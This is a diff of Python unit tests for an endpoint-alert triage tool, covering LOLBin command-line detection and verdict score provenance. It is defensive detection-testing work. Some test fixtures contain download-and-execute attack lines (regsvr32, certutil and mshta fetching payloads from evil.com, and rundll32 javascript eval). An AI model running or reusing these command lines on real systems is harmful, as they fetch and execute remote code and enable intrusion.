@@ -290,6 +290,156 @@ class TestYaraMonolithicPrivateRuleDependency:
 
 
 # ─────────────────────────────────────────────────────────────────────────
+# VerdictEngine evidentiary-provenance tracking (_tp/_fp/_add_score) — the
+# tool must stay blind to SentinelOne's own verdict (see project memory:
+# feeding S1's classification into the tool would create anchoring bias),
+# so the only way to know how independent a verdict actually is is to track
+# which of OUR OWN checks produced each point of score. These tests build a
+# bare VerdictEngine (bypassing __init__, which requires ~10 collaborator
+# analyzers) to test the tracking mechanism itself in isolation.
+# ─────────────────────────────────────────────────────────────────────────
+
+def _bare_verdict_engine():
+    v = s1.VerdictEngine.__new__(s1.VerdictEngine)
+    v.score = 0
+    v.evidence_tp = []
+    v.evidence_fp = []
+    v.observations = []
+    v.score_by_source = {"s1_indicators": 0, "independent": 0}
+    v._evidence_tp_sources = []
+    v._evidence_fp_sources = []
+    v.n_critical = 0
+    v.n_high = 0
+    v.n_critical_s1 = 0
+    v.n_critical_independent = 0
+    v.n_high_s1 = 0
+    v.n_high_independent = 0
+    return v
+
+
+def _mkev(cmdline, field="src.process.cmdline"):
+    return {"details": {field: cmdline}, "event_type": "Process Creation", "timestamp_raw": "x"}
+
+
+class TestCmdlineAnalyzerLolbins:
+    def test_benign_lolbin_usage_not_flagged(self):
+        events = [_mkev("rundll32.exe shell32.dll,Control_RunDLL")]
+        ca = s1.CmdlineAnalyzer(events)
+        assert ca.get_findings() == []
+
+    def test_non_lolbin_executable_not_flagged(self):
+        events = [_mkev(r"C:\Windows\System32\notepad.exe file.txt")]
+        ca = s1.CmdlineAnalyzer(events)
+        assert ca.get_findings() == []
+
+    def test_rundll32_javascript_flagged_critical(self):
+        events = [_mkev('rundll32.exe javascript:eval("evil")')]
+        ca = s1.CmdlineAnalyzer(events)
+        findings = ca.get_findings()
+        assert len(findings) == 1
+        assert findings[0]["severity"] == "CRITIQUE"
+        assert findings[0]["mitre"] == "T1218.011"
+        assert findings[0]["description"].startswith("[LOLBIN]")
+
+    def test_regsvr32_squiblydoo_flagged(self):
+        events = [_mkev("regsvr32.exe /s /n /u /i:http://evil.com/p.sct scrobj.dll")]
+        ca = s1.CmdlineAnalyzer(events)
+        findings = ca.get_findings()
+        severities = {f["severity"] for f in findings}
+        assert "CRITIQUE" in severities  # the /i:http indicator
+        assert all(f["mitre"] == "T1218.010" for f in findings)
+
+    def test_certutil_download_flagged(self):
+        events = [_mkev("certutil.exe -urlcache -split -f http://evil.com/p.exe out.exe")]
+        ca = s1.CmdlineAnalyzer(events)
+        findings = ca.get_findings()
+        assert len(findings) == 1
+        assert findings[0]["severity"] == "CRITIQUE"
+        assert findings[0]["mitre"] == "T1140"
+
+    def test_findings_flow_into_verdict_as_independent(self):
+        # Confirms LOLBin findings reach VerdictEngine via _check_cmdline
+        # and are tagged as independently-derived, not S1-derived.
+        events = [_mkev('mshta.exe http://evil.com/payload.hta')]
+        ca = s1.CmdlineAnalyzer(events)
+        v = _bare_verdict_engine()
+        v._check_cmdline(ca)
+        assert v.score > 0
+        assert v.score_by_source["independent"] > 0
+        assert v.score_by_source["s1_indicators"] == 0
+        assert any("LOLBIN" in e for e in v.evidence_tp)
+
+
+class TestVerdictEngineProvenance:
+    def test_tp_updates_score_and_source_breakdown(self):
+        v = _bare_verdict_engine()
+        v._tp(4, "independent", "[SIGMA CRITICAL] test rule")
+        assert v.score == 4
+        assert v.score_by_source == {"s1_indicators": 0, "independent": 4}
+        assert v.evidence_tp == ["[SIGMA CRITICAL] test rule"]
+        assert v._evidence_tp_sources == ["independent"]
+
+    def test_severity_critical_counted_regardless_of_source(self):
+        v = _bare_verdict_engine()
+        # Independent-only critical evidence (no S1 indicator involved at all)
+        v._tp(4, "independent", "[YARA CRITIQUE] malware.exe", severity="critical")
+        v._tp(3, "independent", "[SIGMA CRITICAL] mimikatz pattern", severity="critical")
+        assert v.n_critical == 2
+        assert v.n_critical_independent == 2
+        assert v.n_critical_s1 == 0
+        # This is the actual bug fix: has_critical must be true from
+        # independent evidence alone, without any S1 behavioral indicator.
+        has_critical = v.n_critical >= 1
+        assert has_critical is True
+
+    def test_s1_derived_and_independent_critical_tracked_separately(self):
+        v = _bare_verdict_engine()
+        v._tp(5, "s1_indicators", "[CRITICAL] ProcessHollowing: ...", severity="critical")
+        v._tp(4, "independent", "[LSASS] Direct LSASS access", severity="critical")
+        assert v.n_critical == 2
+        assert v.n_critical_s1 == 1
+        assert v.n_critical_independent == 1
+
+    def test_fp_can_reduce_score_and_is_tracked(self):
+        v = _bare_verdict_engine()
+        v._tp(5, "independent", "finding")
+        v._fp(-2, "independent", "trusted publisher")
+        assert v.score == 3
+        assert v.score_by_source["independent"] == 3
+        assert v.evidence_fp == ["trusted publisher"]
+        assert v._evidence_fp_sources == ["independent"]
+
+    def test_add_score_affects_total_without_evidence_entry(self):
+        v = _bare_verdict_engine()
+        v._add_score(2, "s1_indicators")
+        assert v.score == 2
+        assert v.score_by_source["s1_indicators"] == 2
+        assert v.evidence_tp == []  # no evidence line for observation-only findings
+
+    def test_high_severity_counted_separately_from_critical_by_source(self):
+        # Regression: a verdict can reach "High" confidence via >=3
+        # critical-or-high findings (has_multiple_high) with zero CRITICAL
+        # findings at all. confidence_basis must describe that case using
+        # the high-severity counts, not only the critical ones, or it
+        # contradicts a "High confidence" verdict with "no strong finding".
+        v = _bare_verdict_engine()
+        v._tp(2, "s1_indicators", "[HIGH] IndicatorA", severity="high")
+        v._tp(2, "s1_indicators", "[HIGH] IndicatorB", severity="high")
+        v._tp(2, "independent", "[SIGMA HIGH] RuleX", severity="high")
+        assert v.n_critical == 0
+        assert v.n_high == 3
+        assert v.n_high_s1 == 2
+        assert v.n_high_independent == 1
+        has_multiple_high = (v.n_critical + v.n_high) >= 3
+        assert has_multiple_high is True
+        # A correct confidence_basis implementation must report BOTH
+        # sources contributed strong (critical-or-high) findings here.
+        strong_independent = v.n_critical_independent + v.n_high_independent
+        strong_s1 = v.n_critical_s1 + v.n_high_s1
+        assert strong_independent == 1 and strong_s1 == 2
+
+
+# ─────────────────────────────────────────────────────────────────────────
 # End-to-end smoke test — full analyze() pipeline on a real sample CSV
 # ─────────────────────────────────────────────────────────────────────────
 
@@ -304,12 +454,39 @@ class TestAnalyzeEndToEnd:
                          "sigma_matches", "ioc_extraction", "kill_chain"):
             assert section in data, f"missing JSON section: {section}"
 
-        score = data["verdict"]["score"]
+        v = data["verdict"]
+        score = v["score"]
         assert isinstance(score, int)
         assert 0 <= score <= 20
 
         assert isinstance(data["data_quality"], dict)
         assert data["data_quality"]["csv_warnings"] == []
+
+        # Evidentiary-provenance invariants (see TestVerdictEngineProvenance)
+        cb = v["contribution_breakdown"]
+        assert cb["s1_indicators_points"] + cb["independent_points"] == v["raw_score"]
+        assert len(v["evidence_tp"]) == len(v["evidence_tp_sources"])
+        assert len(v["evidence_fp"]) == len(v["evidence_fp_sources"])
+        assert set(v["evidence_tp_sources"]) <= {"s1_indicators", "independent"}
+        assert v["confidence_basis"]  # always a non-empty explanation string
+
+    def test_high_confidence_basis_never_claims_no_strong_finding(self):
+        # Regression for the bug found live on bypass.csv: a verdict reaching
+        # "High" confidence via the has_multiple_high (>=3 high-severity,
+        # zero critical) path must not report confidence_basis as "no single
+        # strong finding" — that combination is self-contradictory.
+        bypass_csv = REPO_ROOT / "bypass.csv"
+        if not bypass_csv.exists():
+            import pytest
+            pytest.skip("bypass.csv sample not present")
+        data = s1.analyze(str(bypass_csv), output_report=True)
+        v = data["verdict"]
+        if v["confidence"] == "High":
+            assert "no single strong finding" not in v["confidence_basis"]
+            cb = v["contribution_breakdown"]
+            total_strong = (cb["critical_findings_s1"] + cb["critical_findings_independent"]
+                             + cb["high_findings_s1"] + cb["high_findings_independent"])
+            assert total_strong >= 1
 
     def test_html_generation_does_not_raise(self):
         import s1_report
